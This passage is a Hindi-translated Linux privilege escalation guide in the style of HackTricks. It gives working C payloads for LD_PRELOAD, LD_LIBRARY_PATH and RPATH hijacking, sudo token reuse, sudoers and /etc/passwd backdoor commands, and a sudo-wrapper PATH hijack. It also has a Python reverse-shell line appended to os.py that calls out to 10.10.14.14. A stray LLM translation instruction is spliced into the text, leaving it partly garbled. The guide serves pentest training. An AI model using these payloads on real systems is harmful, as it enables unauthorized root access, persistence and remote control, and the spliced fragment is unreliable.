- suid/sgid वाले executables के लिए, केवल standard paths में मौजूद वे libraries जो खुद भी suid/sgid हैं, preload की जाती हैं।

Privilege escalation तब हो सकती है यदि आपके पास `sudo` के साथ commands execute करने की क्षमता है और `sudo -l` का output **env_keep+=LD_PRELOAD** statement शामिल करता है। यह configuration **LD_PRELOAD** environment variable को persist रहने और `sudo` के साथ commands run होने पर भी recognized होने की अनुमति देती है, जिससे potentially elevated privileges के साथ arbitrary code execute हो सकता है।
```
Defaults        env_keep += LD_PRELOAD
```
Translate the relevant English text to Hindi and return the translation keeping exactly the same markdown and html syntax and following this guidance:

- Don't translate things like code, hacking technique names, common hacking words, cloud/SaaS platform names (like Workspace, aws, gcp...), the word 'leak', pentesting, links and markdown tags.
- Don't translate links or paths, e.g. if a link or ref is to "lamda-post-exploitation.md" don't translate that path to the language. 
- Don't translate or modify tags, links, refs and paths like in:
    - {#tabs}
    - {#tab name="Method1"}
    - {#ref}
generic-methodologies-and-resources/pentesting-methodology.md
{#endref}
    - {#include ./banners/hacktricks-training.md}
    - {#ref}macos-tcc-bypasses/{#endref}
    - {#ref}0.-basic-llm-concepts.md{#endref}
- Don't translate any other tag, just return markdown and html content as is.

Also don't add any extra stuff in your response that is not part of the translation and markdown syntax.
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
तब इसे **compile** करें:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
अंततः, **privileges escalate** करते हुए चलाएँ
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> एक समान privesc का दुरुपयोग किया जा सकता है यदि हमलावर **LD_LIBRARY_PATH** env variable को नियंत्रित करता है क्योंकि वह उस path को नियंत्रित करता है जहाँ libraries को खोजा जाएगा।
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

जब **SUID** permissions वाली किसी binary से सामना हो जो असामान्य लगती हो, तो यह verify करना अच्छी practice है कि क्या वह **.so** files को properly load कर रही है। इसे निम्नलिखित command चलाकर check किया जा सकता है:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
उदाहरण के लिए, _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ जैसी error का सामना होना exploitation की संभावना का संकेत देता है।

इसे exploit करने के लिए, आप एक C file बनाकर, जैसे _"/path/to/.config/libcalc.c"_, उसमें निम्न code शामिल करेंगे:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
यह कोड, एक बार compile और execute होने के बाद, file permissions में manipulation करके और elevated privileges के साथ shell execute करके privileges बढ़ाने का लक्ष्य रखता है।

ऊपर दिए गए C file को इस command के साथ shared object (.so) file में compile करें:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
अंत में, प्रभावित SUID binary को चलाने से exploit trigger होना चाहिए, जिससे संभावित system compromise हो सकता है।

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
अब जब हमने एक SUID binary पाया है जो एक library को ऐसे folder से load कर रहा है जहाँ हम write कर सकते हैं, तो चलिए उस folder में आवश्यक name के साथ library बनाते हैं:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
यदि आपको ऐसी कोई error मिलती है जैसे
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) Unix binaries की एक curated सूची है, जिन्हें attacker द्वारा local security restrictions को bypass करने के लिए exploit किया जा सकता है। [**GTFOArgs**](https://gtfoargs.github.io/) वही है, लेकिन उन मामलों के लिए जहाँ आप किसी command में **sirf arguments inject** कर सकते हैं।

यह project Unix binaries के legitimate functions इकट्ठा करता है जिन्हें restricted shells से बाहर निकलने, elevated privileges को escalate या maintain करने, files transfer करने, bind और reverse shells spawn करने, और दूसरे post-exploitation tasks को आसान बनाने के लिए abuse किया जा सकता है।

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

अगर आप `sudo -l` access कर सकते हैं, तो आप tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) का उपयोग करके check कर सकते हैं कि यह किसी भी sudo rule को exploit करने का तरीका ढूंढता है या नहीं।

### Reusing Sudo Tokens

उन cases में जहाँ आपके पास **sudo access** है लेकिन password नहीं है, आप **sudo command execution का इंतजार करके और फिर session token hijack करके** privileges escalate कर सकते हैं।

Privileges escalate करने की requirements:

- आपके पास user "_sampleuser_" के रूप में पहले से एक shell है
- "_sampleuser_" ने पिछले **15mins** में कुछ execute करने के लिए **sudo** का use किया हो (by default यही sudo token की duration है जो हमें password दिए बिना `sudo` use करने देती है)
- `cat /proc/sys/kernel/yama/ptrace_scope` 0 हो
- `gdb` accessible हो (आप इसे upload कर सकते हैं)

(आप `ptrace_scope` को temporarily `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` से enable कर सकते हैं या `/etc/sysctl.d/10-ptrace.conf` को permanently modify करके `kernel.yama.ptrace_scope = 0` सेट कर सकते हैं)

अगर ये सभी requirements पूरी हों, तो आप privileges escalate करने के लिए यह use कर सकते हैं: [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **पहला exploit** (`exploit.sh`) `/tmp` में binary `activate_sudo_token` create करेगा। आप इसका use करके अपनी session में **sudo token activate** कर सकते हैं (आपको automatically root shell नहीं मिलेगा, `sudo su` करें):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **दूसरा exploit** (`exploit_v2.sh`) _/tmp_ में एक sh shell बनाएगा जो **root के स्वामित्व में होगा और setuid के साथ** होगा
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **तीसरा exploit** (`exploit_v3.sh`) एक **sudoers file** बनाएगा जो **sudo tokens को eternal बना देता है और सभी users को sudo use करने की अनुमति देता है**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

यदि आपके पास इस folder में या इसके अंदर बनाई गई किसी भी file पर **write permissions** हैं, तो आप binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) का उपयोग करके किसी user और PID के लिए **sudo token create** कर सकते हैं।\
उदाहरण के लिए, यदि आप file _/var/run/sudo/ts/sampleuser_ को overwrite कर सकते हैं और आपके पास उस user के रूप में PID 1234 के साथ एक shell है, तो आप password जाने बिना **sudo privileges obtain** कर सकते हैं:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

फ़ाइल `/etc/sudoers` और `/etc/sudoers.d` के अंदर की फ़ाइलें यह configure करती हैं कि `sudo` कौन use कर सकता है और कैसे। ये फ़ाइलें **by default केवल user root और group root** द्वारा ही read की जा सकती हैं।\
**यदि** आप इस फ़ाइल को **read** कर सकते हैं, तो आप **कुछ interesting information** प्राप्त कर सकते हैं, और यदि आप किसी भी फ़ाइल में **write** कर सकते हैं, तो आप **privileges escalate** कर पाएँगे।
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
यदि आप लिख सकते हैं, तो आप इस permission का abuse कर सकते हैं
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
इन permissions का दुरुपयोग करने का एक और तरीका:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

`sudo` binary के कुछ alternatives हैं जैसे OpenBSD के लिए `doas`, इसकी configuration को `/etc/doas.conf` पर check करना याद रखें
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

यदि आप जानते हैं कि एक **user आमतौर पर machine से connect करता है और privileges को escalate करने के लिए `sudo` का उपयोग करता है**, और आपको उस user context में shell मिल गई है, तो आप एक **नया sudo executable** बना सकते हैं जो पहले आपके code को root के रूप में execute करेगा और फिर user's command को चलाएगा। फिर, user context के **$PATH** को modify करें (उदाहरण के लिए .bash_profile में नया path जोड़कर) ताकि जब user sudo execute करे, तो आपका sudo executable execute हो।

ध्यान दें कि अगर user कोई अलग shell (bash नहीं) इस्तेमाल करता है, तो नए path को add करने के लिए आपको दूसरी files modify करनी होंगी। उदाहरण के लिए [sudo-piggyback](https://github.com/APTy/sudo-piggyback) `~/.bashrc`, `~/.zshrc`, `~/.bash_profile` को modify करता है। आप [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py) में एक और example पा सकते हैं।

या कुछ ऐसा चलाकर:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

फ़ाइल `/etc/ld.so.conf` यह दर्शाती है कि **लोड की गई configuration files कहाँ से हैं**। आमतौर पर, इस फ़ाइल में निम्न path होता है: `include /etc/ld.so.conf.d/*.conf`

इसका मतलब है कि `/etc/ld.so.conf.d/*.conf` की configuration files पढ़ी जाएँगी। ये configuration files **अन्य folders की ओर इशारा करती हैं** जहाँ **libraries** को **search** किया जाएगा। उदाहरण के लिए, `/etc/ld.so.conf.d/libc.conf` की content `/usr/local/lib` है। **इसका मतलब है कि system `/usr/local/lib` के अंदर libraries खोजेगा**।

अगर किसी कारण से **किसी user के पास** इन paths में से किसी पर write permissions हों: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, `/etc/ld.so.conf.d/` के अंदर कोई भी file, या `/etc/ld.so.conf.d/*.conf` के अंदर config file में दिया गया कोई भी folder, तो वह privileges escalate करने में सक्षम हो सकता है।\
इस misconfiguration का **how to exploit** जानने के लिए निम्न page देखें:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
lib को `/var/tmp/flag15/` में कॉपी करके इसे इस स्थान पर प्रोग्राम द्वारा `RPATH` variable में specified अनुसार उपयोग किया जाएगा।
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Then `/var/tmp` में एक evil library बनाएं with `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities एक **process को उपलब्ध root privileges का subset** प्रदान करती हैं। यह effectively root **privileges को छोटे और अलग-अलग units** में बाँट देती हैं। इनमें से हर unit को फिर अलग-अलग processes को दिया जा सकता है। इस तरह privileges का पूरा set कम हो जाता है, जिससे exploitation का risk घटता है।\
कैपabilities के बारे में और **उन्हें abuse करने के तरीके** सीखने के लिए निम्न page पढ़ें:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

किसी directory में, **"execute"** bit का मतलब है कि affected user उस folder में "**cd**" कर सकता है।\
**"read"** bit का मतलब है कि user **files** की **list** देख सकता है, और **"write"** bit का मतलब है कि user **files** को **delete** कर सकता है और नए **files** **create** कर सकता है।

## ACLs

Access Control Lists (ACLs) discretionary permissions की secondary layer को represent करती हैं, जो **traditional ugo/rwx permissions को override** करने में सक्षम हैं। ये permissions specific users, जो owner नहीं हैं या group का हिस्सा नहीं हैं, उनके लिए rights allow या deny करके file या directory access पर control बढ़ाती हैं। इस स्तर की **granularity अधिक precise access management** सुनिश्चित करती है। अधिक जानकारी [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux) पर मिल सकती है।

file पर user "kali" को read और write permissions **दें**:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**सिस्टम से विशिष्ट ACLs वाले** files प्राप्त करें:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### sudoers drop-ins पर छिपा ACL backdoor

एक सामान्य misconfiguration `/etc/sudoers.d/` में root-owned file होती है, जिसकी mode `440` होती है, लेकिन फिर भी ACL के जरिए low-priv user को write access मिल जाता है।
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
यदि आप `user:alice:rw-` जैसा कुछ देखते हैं, तो उपयोगकर्ता प्रतिबंधात्मक mode bits के बावजूद एक sudo rule जोड़ सकता है:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
यह एक high-impact ACL persistence/privesc path है क्योंकि `ls -l`-only reviews में इसे आसानी से miss किया जा सकता है।

## Open shell sessions

**पुराने versions** में आप किसी दूसरे user (**root**) के कुछ **shell** session को **hijack** कर सकते हैं।\
**नए versions** में आप केवल **अपने user** की screen sessions से ही **connect** कर पाएंगे। हालांकि, आपको **session** के अंदर **interesting information** मिल सकती है।

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**एक session से attach करें**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

यह **old tmux versions** के साथ एक समस्या थी। मैं root द्वारा बनाई गई tmux (v2.1) session को non-privileged user के रूप में hijack नहीं कर सका।

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**एक session से attach करें**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Debian based systems (Ubuntu, Kubuntu, etc) पर September 2006 और May 13th, 2008 के बीच generated सभी SSL और SSH keys इस bug से प्रभावित हो सकती हैं।\
यह bug तब होता है जब इन OS में एक नया ssh key बनाया जाता है, क्योंकि **सिर्फ 32,768 variations possible थीं**। इसका मतलब है कि सभी possibilities calculate की जा सकती हैं और **ssh public key होने पर आप corresponding private key search कर सकते हैं**। Calculated possibilities यहां मिल सकती हैं: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Specifies whether password authentication is allowed. The default is `no`.
- **PubkeyAuthentication:** Specifies whether public key authentication is allowed. The default is `yes`.
- **PermitEmptyPasswords**: When password authentication is allowed, it specifies whether the server allows login to accounts with empty password strings. The default is `no`.

### Login control files

These files influence who can log in and how:

- **`/etc/nologin`**: अगर present हो, तो non-root logins block करता है और इसका message दिखाता है।
- **`/etc/securetty`**: root कहाँ log in कर सकता है, इसे restrict करता है (TTY allowlist)।
- **`/etc/motd`**: post-login banner (यह environment या maintenance details leak कर सकता है)।

### PermitRootLogin

Specifies whether root can log in using ssh, default is `no`. Possible values:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : no

### AuthorizedKeysFile

Specifies files that contain the public keys that can be used for user authentication. It can contain tokens like `%h`, which will be replaced by the home directory. **You can indicate absolute paths** (starting in `/`) or **relative paths from the user's home**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
That configuration will indicate that if you try to login with the **private** key of the user "**testusername**" ssh is going to compare the public key of your key with the ones located in `/home/testusername/.ssh/authorized_keys` and `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding allows you to **use your local SSH keys instead of leaving keys** (without passphrases!) sitting on your server. So, you will be able to **jump** via ssh **to a host** and from there **jump to another** host **using** the **key** located in your **initial host**.

You need to set this option in `$HOME/.ssh.config` like this:
```
Host example.com
ForwardAgent yes
```
ध्यान दें कि यदि `Host` `*` है, तो हर बार जब user किसी अलग machine पर जाता है, वह host keys तक access कर सकेगा (जो एक security issue है)।

फाइल `/etc/ssh_config` इस **options** को **override** कर सकती है और इस configuration को allow या denied कर सकती है।\
फाइल `/etc/sshd_config` `AllowAgentForwarding` keyword के साथ ssh-agent forwarding को **allow** या **denied** कर सकती है (default is allow)।

यदि आपको किसी environment में Forward Agent configured मिले, तो निम्न page पढ़ें क्योंकि आप इसे **abuse करके privileges escalate** कर सकते हैं:


{{#ref}}
ssh-forward-agent-exploitation.md
{{endref}}

## Interesting Files

### Profiles files

फाइल `/etc/profile` और `/etc/profile.d/` के भीतर की files **scripts हैं जो तब execute होती हैं जब कोई user एक नया shell चलाता है**। इसलिए, यदि आप इनमें से किसी को भी **write या modify** कर सकते हैं, तो आप privileges escalate कर सकते हैं।
```bash
ls -l /etc/profile /etc/profile.d/
```
यदि कोई अजीब profile script मिलती है तो आपको उसमें **sensitive details** की जांच करनी चाहिए।

### Passwd/Shadow Files

OS के आधार पर, `/etc/passwd` और `/etc/shadow` फ़ाइलों का नाम अलग हो सकता है या उनका कोई backup हो सकता है। इसलिए सलाह दी जाती है कि **इन सभी को ढूँढें** और **जांचें कि क्या आप इन्हें पढ़ सकते हैं** ताकि यह देखा जा सके कि फ़ाइलों के अंदर **hashes** हैं या नहीं:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
कुछ अवसरों पर आप `/etc/passwd` (या समकक्ष) फ़ाइल के अंदर **password hashes** पा सकते हैं
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Writable /etc/passwd

पहले, निम्नलिखित commands में से किसी एक से एक password generate करें।
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Then user `hacker` जोड़ें और generated password जोड़ें.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
जैसे: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

अब आप `su` command का उपयोग `hacker:hacker` के साथ कर सकते हैं

वैकल्पिक रूप से, आप बिना password वाला dummy user जोड़ने के लिए निम्नलिखित lines का उपयोग कर सकते हैं।\
WARNING: आप machine की वर्तमान security को कमज़ोर कर सकते हैं।
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NOTE: BSD platforms में `/etc/passwd` `/etc/pwd.db` और `/etc/master.passwd` पर स्थित होता है, और `/etc/shadow` का नाम बदलकर `/etc/spwd.db` कर दिया जाता है।

आपको जाँच करनी चाहिए कि क्या आप **कुछ sensitive files में write** कर सकते हैं। उदाहरण के लिए, क्या आप किसी **service configuration file** में write कर सकते हैं?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
उदाहरण के लिए, यदि मशीन एक **tomcat** server चला रही है और आप **/etc/systemd/ के अंदर Tomcat service configuration file को modify** कर सकते हैं, तो आप lines को modify कर सकते हैं:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
आपका backdoor अगली बार जब tomcat start होगा तब execute किया जाएगा।

### Check Folders

निम्न folders में backups या interesting information हो सकती है: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (शायद आप आख़िरी वाले को read नहीं कर पाएँगे लेकिन try करें)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### अजीब Location/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### अंतिम कुछ मिनटों में संशोधित फ़ाइलें
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB फाइलें
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml फ़ाइलें
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### छिपी हुई files
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **PATH में Script/Binaries**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web files**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **बैकअप्स**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Known files containing passwords

[**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS) का code पढ़ें, यह **कुछ संभावित files** खोजता है जिनमें passwords हो सकते हैं।\
**एक और दिलचस्प tool** जिसे आप इसके लिए उपयोग कर सकते हैं: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) जो एक open source application है, जिसका उपयोग Windows, Linux & Mac पर local computer में stored बहुत सारे passwords retrieve करने के लिए किया जाता है।

### Logs

अगर आप logs पढ़ सकते हैं, तो आपको उनमें **दिलचस्प/गोपनीय जानकारी** मिल सकती है। Log जितना अजीब होगा, उतना ही वह (संभवतः) दिलचस्प होगा।\
साथ ही, कुछ "**bad**" configured (backdoored?) **audit logs** आपको audit logs के अंदर passwords **record** करने की अनुमति दे सकते हैं, जैसा कि इस post में समझाया गया है: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
लॉग्स पढ़ने के लिए **adm** ग्रुप [**adm**](interesting-groups-linux-pe/index.html#adm-group) बहुत उपयोगी होगा।

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

आपको उन फाइलों को भी check करना चाहिए जिनके नाम में या content के अंदर "**password**" शब्द हो, और logs के अंदर IPs और emails भी, या hashes regexps भी।\
मैं यहाँ यह नहीं बताने वाला कि यह सब कैसे करना है, लेकिन अगर आप interested हैं तो आप आख़िरी checks देख सकते हैं जो [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform करता है।

## Writable files

### Python library hijacking

अगर आपको पता है कि कोई python script **कहाँ से** execute होने वाली है और आप उस folder के अंदर **write** कर सकते हैं या आप **python libraries modify** कर सकते हैं, तो आप OS library को modify करके उसे backdoor कर सकते हैं (अगर आप वहाँ write कर सकते हैं जहाँ python script execute होने वाली है, तो os.py library को copy and paste कर दें)।

library को **backdoor** करने के लिए os.py library के end में निम्न line add करें (IP और PORT बदलें):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

`logrotate` में एक vulnerability उन users को, जिनके पास किसी log file या उसके parent directories पर **write permissions** हैं, संभावित रूप से escalated privileges दिला सकती है। ऐसा इसलिए है क्योंकि `logrotate`, जो अक्सर **root** के रूप में चलता है, arbitrary files execute करने के लिए manipulated किया जा सकता है, खासकर _**/etc/bash_completion.d/**_ जैसी directories में। यह जांचना महत्वपूर्ण है कि permissions सिर्फ _/var/log_ में ही नहीं, बल्कि उन सभी directories में भी हों जहाँ log rotation लागू होती है।

> [!TIP]
> यह vulnerability `logrotate` version `3.18.0` और पुराने versions को प्रभावित करती है

इस vulnerability के बारे में अधिक विस्तृत जानकारी इस page पर मिल सकती है: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

आप इस vulnerability का exploit [**logrotten**](https://github.com/whotwagner/logrotten) के साथ कर सकते हैं।

यह vulnerability [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** के बहुत समान है, इसलिए जब भी आपको लगे कि आप logs को alter कर सकते हैं, यह जांचें कि उन logs को कौन manage कर रहा है और देखें कि क्या आप symlinks के साथ logs को replace करके privileges escalate कर सकते हैं।

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

यदि, किसी भी कारण से, कोई user _/etc/sysconfig/network-scripts_ में एक `ifcf-<whatever>` script **write** कर सकता है **या** किसी existing script को **adjust** कर सकता है, तो आपका **system pwned** है।

